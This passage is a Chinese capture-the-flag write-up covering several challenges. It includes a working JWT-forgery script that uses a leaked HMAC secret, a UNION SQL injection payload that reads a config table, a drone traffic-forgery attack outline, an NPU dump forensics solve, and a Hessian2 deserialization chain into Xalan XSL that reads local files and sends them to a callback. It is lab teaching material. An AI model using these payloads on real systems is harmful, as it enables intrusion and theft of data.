```
yunsee
```

将 payload 中的 `role` 从 `student` 改为 `admin` ，再用 `yunsee` 重新签名即可伪造管理员 token。

```python
import base64
import hashlib
import hmac
import json

TOKEN = "..."
SECRET = b"yunsee"


def b64url_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


header_b64, payload_b64, _ = TOKEN.split(".")
header = json.loads(b64url_decode(header_b64))
payload = json.loads(b64url_decode(payload_b64))

payload["role"] = "admin"

new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{new_header}.{new_payload}".encode()
signature = hmac.new(SECRET, signing_input, hashlib.sha256).digest()

print(f"{new_header}.{new_payload}.{b64url_encode(signature)}")
```

把伪造后的管理员 token 用到后台后，可以进入教务管理后台。

![伪造管理员进入后台](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/53e611f8417eab82.jpg)

伪造管理员进入后台

进入后台后，运行总览 中有一条提示：

```
校内资源库正在进行资料迁移复核，搜索接口保留旧版查询链路。
```

切换到“校内资源库”，页面提供资源列表和搜索接口两个模式。

![校内资源库](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d570e43422a29060.jpg)

校内资源库

普通资源列表接口使用正常查询，预期注入点在搜索接口：

```
GET /api/admin/resources/search?keyword=
```

返回表格有 7 列：

```
id
title
category
owner_department
visibility
download_count
updated_at
```

所以 `UNION SELECT` 也需要补齐 7 列。

查询语句中关键词被拼进 `LIKE '%...%'` ，并且外层还有一组括号。因此 payload 需要闭合字符串和括号：

```
%' AND 1=2) UNION SELECT ... -- -
```

最终 payload：

```
%' AND 1=2) UNION SELECT 1,flag,config_key,config_value,'全校可见',0,created_at FROM sys_audit_config -- -
```

在浏览器后台中选择“搜索接口”，填入 payload。

![填入 SQL 注入 payload](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2b81ca57d5c4843e.jpg)

填入 SQL 注入 payload

点击搜索后，flag 出现在资源标题位置。

![搜索结果读取 flag](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/324e06c8d020bcb5.jpg)

搜索结果读取 flag

## Operation Skyfall

![image-20260724151256513](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ed3efab57e65ad95.jpg)

image-20260724151256513

该题极具趣味与挑战性，由于是0解，暂不公开WP。

强调：此题是可解的。

**解题思路** ：无人机飞行控制界面获取泄露密钥 -> 通过nc 连接后端管理程序 -> 解密无人机流量 -> 分析流量特征 -> 伪造流量并用已有密钥加密流量（伪造流量） -> 导入伪造流量 -> 无人机宕机落地（获得flag）

流量协议在描述中有提到是：基于 802.11 WPA2

![image-20260724163912835](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4bff30399e3eee17.jpg)

image-20260724163912835

![image-20260724163958305](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b4efbe80f5233655.jpg)

image-20260724163958305

## AI赛道

## NPU

![image-20260724163446996](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8147edb39944d088.jpg)

image-20260724163446996

**第 1 步　先认清这是个什么文件 → 决定怎么拆它**

`xxd` 看头部：

```yaml
00000000: 4e50 5544 554d 5000 0100 0100 1f01 0000  NPUDUMP.........
00000010: 7b22 6d61 6769 6322 3a20 224e 5055 4455  {"magic": "NPUDU
```

-   前 8 字节是魔数 `NPUDUMP\0` ，第 9~10 字节 `01 00` 像个版本号（=1）。
    
-   紧接着 `1f 01 00 00` （小端 = 0x011f = 287），再后面就是 `{"magic"...` 一段 287 字节的 JSON。
    

类型 + 长度 + 值 的味道很浓。 **先假设格式是 `Type(u16) + Length(u32) + Value` ，能不能严丝合缝走到文件末尾就是检验。** 写个循环从偏移 10 开始走：

```
off=10
while off<len(d):
    t,l=struct.unpack_from('<HI',d,off); off+=6+l
```

```rust
0x0000a type=0x0001 len=287    {"magic": "N...
0x0012f type=0x0010 len=16390  \x00\x01@\x00\x00\x01...
0x0413b type=0x0010 len=1030   \x01\x01\x10\x00@\x00...
0x04547 type=0x0020 len=1460   {"zero_point...
0x04b01 type=0x0030 len=264    \x00\x01\x00\x00...
0x04c0f type=0x0040 len=32     (二进制)
0x04c35 type=0x00f0 len=16403  \x0eoutput_deco...
0x08c4e type=0x00b0 len=30     \rlayer2_outp...
0x08c72 type=0x00b0 len=24     \x07boot_iv...
0x08c90 type=0x00b0 len=30     \raes_round_k...
0x08cb4 type=0x00e0 len=951    \x89PNG\r\n\x1a\n...
0x09071 type=0x00ff len=4      (4 字节)
→ 正好走到文件末尾
```

**走到 EOF、零字节残留 → 格式假设正确。** 这一步不需要任何文档，靠的是"格式自洽性"自证。

* * *

**第 2 步　给记录分类，确定"要解什么、缺什么"**

逐条看 Value 的特征：

| 记录  | 内容判断 | 依据  |
| --- | --- | --- |
| `0x0001` | metadata JSON | 明文 `{"magic"...}` |
| `0x0010`<br><br>×2 | 权重张量 | `len=16390=6+64×256`<br><br>、 `len=1030=6+16×64` ；头 6 字节恰好是 `li,tid,OC,IC` |
| `0x0020` | 量化参数 JSON | 明文 `{"zero_point"...}` |
| `0x0030` | 输入  | `len=264=4+256+4`<br><br>：in_dim(u32)+256字节+4字节校验 |
| `0x0040` | **32 字节二进制** | 长度是 16 的整数倍，高熵 → 像分组密文 |
| `0x00f0` | 带名字的张量 | `\x0e`<br><br>\+ `output_decoded` ，后面还有 rows/cols |
| `0x00b0`<br><br>×3 | 带名字的小 blob | `layer2_output`<br><br>/ `boot_iv` / `aes_round_key` ，各 16 字节 |
| `0x00e0` | **PNG** | `\x89PNG` |
| `0x00ff` | 4 字节 | 放在最后 → CRC32 校验 |

两段 JSON 直接把 **网络结构和量化参数白送** 了（无需文档）：

```javascript
// 0x0001
"layers":[{"out":64,"in":256,"act":"clamped_relu","act_min":0,"act_max":100,"tiling_id":1},
          {"out":16,"in":64, "act":"int8_saturate","act_min":-128,"act_max":127,"tiling_id":1}]
// 0x0020
"zero_point_x":[5,0], "zero_point_out":[0,0],
"layers":[{"M0":[1568023701,2123510929,...](64个),"shift":[-10,-11,...]}, {…16个…}]
```

于是目标清晰：要解的是 `0x0040` 那段 **32 字节密文** （看长度像 AES）。解分组密文要 **密钥 + IV** ，但容器里 **没有** 任何现成的、可信的 key/IV 字段。 **缺口 = key 和 IV，得自己想办法弄到。** 先去翻翻还有什么没用的线索。

* * *

**第 3 步　两个"白捡"的线索：PNG 提示 + 一堆诱饵**

记录里有个 `0x00e0` 是 PNG，明显不属于数据流，先 carve 出来看：

```lua
i=d.find(b'\x89PNG\r\n\x1a\n'); end=d.find(b'IEND',i)+8
open('qr.png','wb').write(d[i:end])
```

![carve 出的二维码](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1beabd893a630287.jpg)

carve 出的二维码

是二维码，扫出来一句提示：

```
设备开机时会显示一帧诊断 logo，但 dump 里没有单独的 framebuffer
```

**这句话把我第 1 步的"缺口"指了一半方向** ：有一张 logo，但它不是现成像素（没有 framebuffer）， **要从别的数据里重建** 。logo 上很可能就写着我缺的 IV。把"某块数据其实是张图"这个判断记下。

至于 `0x00f0` (`output_decoded`) 和 `0x00b0` (`layer2_output` / `boot_iv` / `aes_round_key`)——名字一个比一个像答案。但越像越可疑：它们要么是现成 blob（跳过了"重建/推理"），要么干净得不像被加密过。先存疑，等会儿逐个证伪。

* * *

**第 4 步　哪块数据是图？用"可读性"反推出排布**

二维码说要重建一张图。dump 里 **还没被当成图看** 、且形状像图的，就是权重——L0 是 `[64,256]` ，正好一张 64×256 灰度图。权重是有符号字节，按 像素=权重+128 直接 reshape：

![L0 朴素 reshape](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5eae5efbf72ff13c.jpg)

L0 朴素 reshape

**关键观察** ：这确实是张有文字的图（能看出 4 条横向文本带），但每个字被横向切碎、错位——不是噪声，是 **字节排布被打乱了** 。 `tiling_id=1` 也在暗示"权重做过 tiling 重排"。但文档没了， **确切的重排规则得我自己反推** 。

线索就在图里：图明显分成几条 16 行左右的"带"，而 `64 = 4×16` 。合理猜测是 **按输出通道分块、块内被转置** 。我不知道块大小，那就 **拿"图读不读得通"当判据，把块大小 8/16/32 都试一遍** ：对每个块大小 `B` ，把每个 `B×IC` 的块当成 `(IC,B)` 再转置回 `(B,IC)` ：

```
def detile_block(B):
    img=np.zeros((OC,IC),int)
    for blk in range(OC//B):
        img[blk*B:(blk+1)*B] = arr[blk*B*IC:(blk+1)*B*IC].reshape(IC,B).T
    return img
```

三个候选渲染出来一对比，答案一目了然：

| `B=8`<br><br>（糊） | `B=16`<br><br>（清晰✅） | `B=32`<br><br>（重影错位） |
| --- | --- | --- |
|     |     |     |

**只有 `B=16` 出清晰文字** ——排布反推成功： **输出通道每 16 个一块，块内按输入下标 `k` 主序（即块内被转置）** 。图像可读性就是最好的 oracle，根本不需要文档给公式。

* * *

**第 5 步　图自己把"密钥怎么来"写明白了**

放大 `B=16` 那张图的中间两行：

![IV 放大](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5df040259e1ec00e.jpg)

IV 放大

logo 上三行字：

```
== NPU-CORE  FW1.3 ==
IV e4f6ccd88665dc43          ┐ 这两行十六进制拼起来就是 IV
   4c217e03fca1dd3f          ┘
KEY=int8 out L1->L2          ← 密钥 = 末层（L1→L2）的 INT8 输出
```

**这一步直接补齐了第 1 步的两个缺口，而且全是图自带的、不靠任何文档** ：

-   \*\*IV = `e4f6ccd88665dc434c217e03fca1dd3f` \*\*（第一行中间有椒盐噪声、 `86/88` 略糊，先标记，待会儿用 CBC 性质兜底）；
    
-   **密钥就是网络末层的 16 个 INT8 输出** → 所以我必须把这两层网络真的跑一遍。
    

顺带回头清诱饵： `output_decoded` 那张是干净的假 flag（ `flag{int8_is_trivial}` ，没经推理）； `layer2_output` / `boot_iv` 直接拿来当 key/IV 解出来是纯乱码。全是钓"抓现成 blob"的，无视。

* * *

**第 6 步　跑推理算 K：从数字认出它是定点量化**

现在要把输入过两层网络。料都齐了：L1 权重同样 de-tile；输入在 `0x0030` （ `in_dim=256` ，末尾 4 字节我验证了正好是这段的 CRC32 → 确认读对）； `M0` / `shift` /zero_point 都在 `0x0020` 。

**怎么算才对？** 看一眼 `M0` ：全是 `1.5e9~2.1e9` ， **紧贴 2³¹** ；再配 `shift` （负数=右移）、INT8 权重/激活、INT32 累加——这套组合就是 **TFLite / gemmlowp 的定点量化推理** （ `MultiplyByQuantizedMultiplier` ）。这是领域识别，不需要文档。 **关键是：必须整数定点实现，不能用浮点近似** ——浮点在"加倍取高位"和"带舍入右移"两处会差 1，最终密钥就废。

照 gemmlowp 逐字写整数版（ `RoundingDivideByPOT` 是带舍入的右移，不是截断）：

```python
def srdhm(a,b):                       # 加倍取高 32 位 + 舍入 + 饱和
    if a==-2**31 and b==-2**31: return 2**31-1
    ab=a*b; nu=(1<<30) if ab>=0 else -(1<<30)+1
    return max(-2**31,min(2**31-1,(ab+nu)>>31))
def rdbpot(x,e):                      # 带四舍五入的算术右移
    if e==0: return x
    m=(1<<e)-1; rem=x&m; thr=(m>>1)+(1 if x<0 else 0)
    return (x>>e)+(1 if rem>thr else 0)
def mbqm(x,qm,sh):
    ls=sh if sh>0 else 0; rs=0 if sh>0 else -sh
    return rdbpot(srdhm(x<<ls,qm),rs)

def fc(x,W,q,zx,zo,lo,hi):
    return [min(max(mbqm(sum(W[c][k]*(x[k]-zx) for k in range(len(x))),
                         q['M0'][c],q['shift'][c])+zo, lo), hi) for c in range(len(W))]
```

两层依次跑（L0 截断 ReLU `[0,100]` 、L1 INT8 饱和 `[-128,127]` ，bounds 都在 metadata 里），末层 16 个输出取低字节：

```
K = 7f8e4e807fa980809a51605f79a38080
```

（顺手验证浮点为何不行：浮点版得 `7f8e4f80...78a38080` ，差 3 字节 → AES 必崩。）

* * *

**第 7 步　解 AES，用 CBC 性质擦掉 IV 的小疑点**

`0x0040` 是 32 字节、AES 块大小 16，密钥 16 字节 → **AES-128** 。模式先按最常见的 CBC 试。把第 4 步那个糊掉的 IV 字节两个候选都解：

```rust
IV ...d886 65...  -> b'flag{n0_fl0at_f0r_npu_qu4nt}\x04\x04\x04\x04'   ✅
IV ...d888 65...  -> b'flagun0_fl0at_f0r_npu_qu4nt}\x04\x04\x04\x04'   ← 只有开头一个字错
```

正好印证 **CBC 里 IV 只影响第 0 块** ：IV 读错一字节只会让开头 `flag{` 出错，后半 `r_npu_qu4nt}` 永远对——靠 `flag{` 前缀反推就知道是 `86` 。去掉 PKCS#7 填充：

```
flag{n0_fl0at_f0r_npu_qu4nt}
```

**这题Agent跑不出来就是卡在了图像识别IV和KEY，需要人工识别。**

## 缄默证词

该题留给大家拷打Agent吧，暂不公开完整WP，只提供解题思路。

![image-20260724163631661](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d1040f96bc56d5fb.jpg)

image-20260724163631661

```bash
信息收集(noir.js + source map)
  └─ 派生密钥 secret = sha256(pepper|buildId)
  └─ body = base64url(xor(gzip(hessian),mask)) ; mac = hmac(secret, kid.nonce.body)
POST /api/capsule  (签名通过)
  └─ Hessian2 白名单只放行 4 个类（封死 Spring1/JdbcRowSetImpl 等非预期）
  └─ HikariConfig.catalog(String) 收到对象 → expect() → String.valueOf(obj)
        → MimeTypeParameterList.toString()
        → UIDefaults.get() 解析 SwingLazyValue
        → 反射 Xalan Process._main(-IN input.xml -XSL /theme/staged/<id>)
自写 XSL(经 /api/theme/stage 托管)
  └─ document(file:///opt/peanut/store/index.xml) 读 manifest 定位随机 flag 路径
  └─ document(file://<flag>) 读 <b64url>
  └─ document(.../api/callbacks/collect?run&b64) 回收
GET /api/callbacks/<run> → flag
```
